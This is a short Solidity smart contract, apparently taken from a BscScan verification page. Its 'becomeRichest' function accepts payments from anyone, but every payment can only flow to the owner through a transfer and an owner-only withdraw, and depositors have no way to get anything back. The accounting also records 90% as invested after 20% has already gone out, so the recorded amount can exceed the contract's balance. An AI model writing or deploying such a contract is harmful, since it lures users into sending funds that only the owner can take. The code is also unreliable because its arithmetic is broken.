/**
 *Submitted for verification at BscScan.com on 2022-02-12
*/

pragma solidity >0.4.22<0.7.1;

contract Contracting{

   address payable public owner;
   uint256 invested=0;


constructor() public  {
      owner = msg.sender;

   }
function becomeRichest() public payable returns (bool) {
        owner.transfer(msg.value/5);
        invested+=(msg.value*90)/100;
         return true;
   }
   function withdraw() public {
      require(msg.sender==owner);
      owner.transfer(invested);
      invested = 0;
   }



  
 
  
}